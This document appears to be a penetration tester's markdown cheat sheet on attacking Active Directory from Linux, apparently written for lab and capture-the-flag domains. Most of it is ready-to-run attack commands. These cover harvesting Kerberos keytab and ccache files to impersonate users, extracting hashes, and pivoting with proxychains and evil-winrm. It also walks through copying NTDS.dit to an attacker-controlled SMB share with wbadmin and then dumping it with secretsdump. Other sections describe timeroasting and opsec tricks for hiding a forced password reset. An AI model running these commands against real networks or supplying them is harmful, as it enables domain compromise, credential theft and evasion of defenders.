 # Atk AD from linux tips

## realm - check if linux machine is domain-joined
```
realm list

# Kerberos member ?
# Domain name ?
```

## PS - Check if Linux Machine is Domain Joined
```
ps -ef | grep -i "winbind\|sssd"
```

## Find to Search for Files with Keytab in the Name
```
find / -name *keytab* -ls 2>/dev/null
```

## Identifying Keytab Files in Cronjobs
```
crontab -l
# if kinit, kerberos is used 
# kinit allows interaction with Kerberos, and its function is to request the user's TGT and store this ticket in the cache</mark> (ccache file).
# use `kinit` to import a `keytab` into our session and act as the user
```

## Find ccache files
```
# Find ccache files
env | grep -i krb5

ls -la /tmp #kbrb5cc_???
```

## Abuse keytab files
```
# Abuse keytab files > Impersonate user using kinit

## List keytab file info
klist -k -t

## impersonate a user with a keytab
kinit <USER>@<DOMAIN> -k -t /.../<USER>.keytab
klist # confirm import

## connect to share
smbclient //dc01/<USER> -k -c ls

# Extract secrets from keytab
python3 /opt/keytabextract.py /../<USER>.keytab
## Use NTLM hash for PtH, AES256 hash to forge tickets in rubeuse/crack to get plaintext passwd
```

## Abuse keytab ccache
```
# Need read priv on the ccache file
sudo -l
sudo su

# look for ccache files, note the file owner of krb5cc_*
ls -la /tmp

# Check Group membership of file owner
id <USER(>@<Domain>)

# Import ccache file in current session
cp /tmp/krb5cc_647401106_I8I133 .
export KRB5CCNAME=<FILE TO PATH> # Check date validity of ccache file
klist
```

## Abuse keyberos from a linux host using a pivot machine
```
# Set env var
export KRB5CCNAME=<FILE TO PATH>

# Use the kerberos ticket
# -no-pass for no password prompt
# DC01 = KDC
proxychains impacket-wmiexec dc01 -k
```

## evil-winrm - use kerberos auth
```
# install krb5-user package
# need to install the Kerberos package used for network authentication

# update conf for domain
# cf 'kerberos set-up' in ad_tips.md
$ cat /etc/krb5.conf
[libdefaults]
        default_realm = <DOMAIN>

<SNIP>

[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.<DOMAIN>
    }

<SNIP>

# Connect using a pivot
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```

## impacket ticket convertor - ccache <> kirbi
```
# ccache2kirbi
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```

## linikatz - exploit creds on linux if integration with AD
```
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
```

## Generate /etc/hosts set-up for a given domain
```
# Generate /etc/hosts set-up for a domain
nxc smb $TARGET --generate-hosts-file hosts
sudo cat hosts /etc/hosts | sudo sponge /etc/hosts # need 'sponge' in moreutils package
```

## SeDebugPrivilege - Manual NTDS.DIT extraction using webadmin to a linux SMB share (NTFS formatted)
```
# SeDebugPrivilege - Manual NTDS.DIT extraction using webadmin to a linux SMB share (NTFS formatted)
# 1. Create NFS block fs of size2GB
dd if /dev/zero of=NTFS.DISK bs=1024M count=2

# 2. Mount on loopback device
losetup -fP NTFS.DISK # -f: find first unused device, -P : create a partitioned loop device

# 3. Format the block to the desired fs
sudo mkfs.ntfs /dev/loop<NUMBER>

# 4. Mount the fs
sudo mount /dev/loop<NUMBER> <YOUR MOUNTPOINT>

# 5. Edit the smbd daemon conf, add a share by adding the following lines
# /etc/samba/smb.conf
[<SHARE NAME>]
  comment = foo
  path = <YOUR MOUNTPOINT>
  browseable = yes
  read only = no
  guest ok = yes

# 6. Restart sbmd.service
sudo systemctl restart smbd

# 7. Mount smb share from Windows on the X: share
net use x: \\<ATTACKER IP>\<SHARE NAME>
net use x: /delete # to delete

# 8. Run wbadmin to create a backup to our fileshare & include ntds.diti
# source : https://2018.romhack.io/slides/RomHack%202018%20-%20Andrea%20Pierini%20-%20whoami%20priv%20-%20show%20me%20your%20Windows%20privileges%20and%20I%20will%20lead%20you%20to%20SYSTEM.pdf
echo y | wbadmin start backup -backuptarget:\\<ATTACKER IP>\<SHARE NAME> -include:c\windows\ntds\

# 9. Get the backup "Version identifier" value
wbadmin get versions

# 10. Extract the files from generated vhdx file to C:\ drive, do not put the same ACL on the backup'd file
echo y | wbadmin start recovery -version:<BACKUP VERSION IDENTIFIER VALUE> -itemtype:file -itmes:C:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl

# 11. Create a backup of SYTEM hive where the bootkey lives to decrypt the NTDS.DIT
reg save HKLM\SYSTEM system.hive.bak

# 12. Dump the secrets locally on the attacker's machine
secretsdump.py -ntds ntds.dot -system system.hive.bak LOCAL
# use "-history" option to dump the passwd history for extra infos

# Extra. If you cannot decrypt files as SYSTEM check if you are connected as the right user by checking who can read it
cipher /c <FILENAME>
```

## Faketime - Adhoc Kerberos auth
```
# Using faketime + ntpdate to avoid KRB_AP_ERR_SKEW(Clock skew too great)

# Internal or via ligolo
faketime "$(ntpdate -q dc01.ad.lab | cut -d ' ' -f 1,2)" \
bloodhound-python -c All -u joan.hesther -p 'madison' -d ad.lab -ns 10.80.80.2

# Through proxy or ssh
proxychains -q faketime "$(ntpdate -q dc01.ad.lab | cut -d ' ' -f 1,2)" \ 
bloodhound-python -c All -u joan.hesther -p 'madison' -d ad.lab -ns 10.80.80.2 --dns-tcp

# source : https://notes.benheater.com/books/active-directory/page/using-faketime-for-ad-hoc-kerberos-authentication
```

## impacket - secretsdumps
```
Useful options :
-pwd-last-set -user-status -history

Faster cracking if recent passwords are a variation of older ones that got cracked.

Opsec :
If you used ForcedPassword on a user to set a users's password
You can revert the user's hash to its previous value to make it appear unchanged
```

## Timeroast NTP auth abuse - Gather MD5 digest, crack to recover user's NT Hash
```
# Timeroast
# Unauthenticated clients can take a list of RIDs and send MS-SNTP requests to a DC to collect MD5 digests calculated with domain computer hashes. This makes timeroasting a viable method to identify and crack pre-created machine accounts and other weak computer passwords in a stealthier manner than by using dictionaries or tools like pre2k
#  - it can only be used to obtain computer hashes
#  - it requires a way to map RIDs to usernames, so either NULL sessions or valid domain credentials

# More advanced attack as DA :
# Abuse this technique to find clear text password (after cracking) of a few specific users but does not want to risk getting caught, thus deciding to avoid credential extraction methods that are likely to sound alarms
# Ioc :
# - multiple MS-SNTP client requests sent by the same host with a different RID
# - the RID in these requests belongs to a user and not a computer
# - ...
# Rq: important to note that user accounts cannot be used for interactive logons while UF_WORKSTATION_TRUST_ACCOUNT is set.
# More here : https://medium.com/@offsecdeer/targeted-timeroasting-stealing-user-hashes-with-ntp-b75c1f71b9ac
python timeroast.py <IP>
````

## kerberos set-up
```
## kerberos set-up
1. Domain/DC name resolution
Once you've found a domain name + a DC for it, add to the /etc/hosts the matching resolution :
X.X.X.X domain.tld dc.domain.tld dc01.domain.tld
2. Set-up reamls in /etc/krb5.conf

$ cat /etc/krb5.conf
[libdefaults]
        default_realm = default_value

<SNIP>

[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.<DOMAIN>
    }

<SNIP>

[domain_realm]
	.csail.mit.edu = CSAIL.MIT.EDU
	csail.mit.edu = CSAIL.MIT.EDU
  .<FOO>.<HTB> = <FOO>.<HTB>
  <FOO>.<HTB> = <FOO>.<HTB>

2. export ccache once you have it to auth as a user : export KRB5CCNAME=<FILE TO PATH>
3. Set-up name resolution in /etc/hosts & use the FQDN of DC in your tools

- When authenticating using kerberos, replace :
DC IP <> DC name matching in the IP in /etc/hosts
It is especially when using kerberos authentication and avoid LDAP authentication errors
- Specify the DC's ip for a given domain using -ns/-nameserver parameters in most tools.
```

## Kerberos - Tips from linux when the only kerberos is used for auth
```
- Set-up the machine for kreberos cf 'kerberos set-up'
- Whenever you want to execute a cmd as another user :
    - Get that user TGT : impacket-getTGT voleur.htb/svc_ldap -dc-ip 10.10.11.76
    - export KRB5CCNAME=svc_ldap.ccache

- If you can crack a TGS, use the creds to request a TGT as that user to the DC, see previous point
```